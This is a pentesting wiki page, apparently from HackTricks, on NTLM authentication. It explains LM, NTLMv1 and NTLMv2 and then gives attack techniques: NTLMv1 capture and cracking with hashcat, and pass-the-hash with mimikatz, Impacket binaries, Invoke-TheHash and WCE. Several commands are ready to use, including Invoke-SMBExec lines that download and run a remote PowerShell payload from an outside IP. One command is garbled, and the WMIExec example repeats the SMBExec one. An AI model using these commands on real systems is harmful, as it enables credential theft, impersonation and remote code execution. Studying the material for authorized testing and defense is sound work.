# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Basic Information

**NTLM Credentials**: Domain name (if any), username and password hash.

**LM** is only **enabled** in **Windows XP and server 2003** (LM hashes can be cracked). The LM hash AAD3B435B51404EEAAD3B435B51404EE means that LM is not being used (is the LM hash of empty string).

By default **Kerberos** is **used**, so NTLM will only be used if **there isn't any Active Directory configured,** the **Domain doesn't exist**, **Kerberos isn't working** (bad configuration) or the **client** that tries to connect using the IP instead of a valid host-name.

The **network packets** of a **NTLM authentication** have the **header** "**NTLMSSP**".

The protocols: LM, NTLMv1 and NTLMv2 are supported in the DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 and NTLMv2

You can check and configure which protocol will be used:

### GUI

Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).

![](<../../.gitbook/assets/image (92).png>)

### Registry

This will set the level 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Possible values:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Basic NTLM Domain authentication Scheme

1. The **user** introduces his **credentials**
2. The client machine **sends an authentication request** sending the **domain name** and the **username**
3. The **server** sends the **challenge**
4. The **client encrypts** the **challenge** using the hash of the password as key and sends it as response
5. The **server sends** to the **Domain controller** the **domain name, the username, the challenge and the response**. If there **isn't** an Active Directory configured or the domain name is the name of the server, the credentials are **checked locally**.
6. The **domain controller checks if everything is correct** and sends the information to the server

The **server** and the **Domain Controller** are able to create a **Secure Channel** via **Netlogon** server as the Domain Controller know the password of the server (it is inside the **NTDS.DIT** db).

### Local NTLM authentication Scheme

The authentication is as the one mentioned **before but** the **server** knows the **hash of the user** that tries to authenticate inside the **SAM** file. So, instead of asking the Domain Controller, the **server will check itself** if the user can authenticate.

### NTLMv1 Challenge

The **challenge length is 8 bytes** and the **response is 24 bytes** long.

The **hash NT (16bytes)** is divided in **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): the **last part is filled with zeros**. Then, the **challenge** is **ciphered separately** with each part and the **resulting** ciphered bytes are **joined**. Total: 8B + 8B + 8B = 24Bytes.

**Problems**:

* Lack of **randomness**
* The 3 parts can be **attacked separately** to find the NT hash
* **DES is crackable**
* The 3º key is composed always by **5 zeros**.
* Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.

### NTLMv1 attack

Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.

You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
If you are using `responder` you could try to \*\*use the flag `--lm` \*\* to try to **downgrade** the **authentication**.\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](./#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) for example).

### NTLMv1 attack with hashcat

NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.

The command
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
would output the below:

```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Create a file with the contents of:
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.

```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

In this case we know the password to this is password so we are going to cheat for demo purposes:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

We now need to use the hashcat-utilities to convert the cracked des keys into parts of the NTLM hash:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

finally the last part
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

combine them together
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.

**The first response** is created by ciphering using **HMAC\_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC\_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.

The **second response** is created using **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)

If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Once you have the hash of the victim**, you can use it to **impersonate** it.\
You need to use a **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.

**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**

### **Mimikatz**

**Needs to be run as administrator**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
```

This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).

### Pass-the-Hash from linux

You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
[**Access here to learn how to do it.**](../../windows/ntlm/broken-reference/)

### Impacket Windows compiled tools

You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* There are several more Impacket binaries...

### Invoke-TheHash

You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec

```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

This function is a **mix of all the others**. You can pass **several hosts**, **exclude** someones and **select** the **option** you want to use (_SMBExec, WMIExec, SMBClient, SMBEnum_). If you select **any** of **SMBExec** and **WMIExec** but you **don't** give any _**Command**_ parameter it will just **check** if you have **enough permissions**.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Needs to be run as administrator**

This tool will do the same thing as mimikatz (modify LSASS memory).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Manual Windows remote execution with username and password

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extracting credentials from a Windows Host

**For more information about** [**how to obtain credentials from a Windows host you should read this page**](broken-reference)**.**

## NTLM Relay and Responder

**Read more detailed guide on how to perform those attacks here:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Parse NTLM challenges from a network capture

**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
